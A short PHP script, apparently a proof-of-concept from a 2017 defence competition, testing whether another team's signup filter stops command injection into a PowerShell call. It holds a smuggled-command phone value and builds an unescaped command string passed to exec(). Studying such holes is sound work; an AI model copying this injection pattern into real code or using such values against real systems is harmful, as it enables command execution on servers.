<?php

// Source for the vulnerable code is from Team1's GitLab project:
//      https://gitlab.com/ArtificialAmateur/CDC-2017/blob/master/iis/signup.php

// Mock user input
$username = 'username';
$password = 'password';
$address  = 'address';

// Command injection
$phone = 'phone\';" && echo "howdy doodly" > team1.txt';

$powershell_cmd = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -NoProfile -Noninteractive -command';

// I wasn't able to get the original script so we use a dummy one here
$scriptName = 'C:\Development\Projects\OtherProjects\CDC\C3DC-2017\SignUpApp\CommandInjection\adduser.ps1';

// Team1's prevention method as seen on thier GitLab:
//      https://gitlab.com/ArtificialAmateur/CDC-2017/blob/ccde2308e829db1ea1fcc38dde5b1adc0c5cd63e/iis/signup.php#L22-24
if(strlen($phone) <= 100) {
    $phone = stripslashes(strip_tags(trim($phone)));
}

$cmd = "{$powershell_cmd} \". '{$scriptName}' '{$username}' '{$password}' '{$address}' '{$phone}';\"";

exec($cmd);
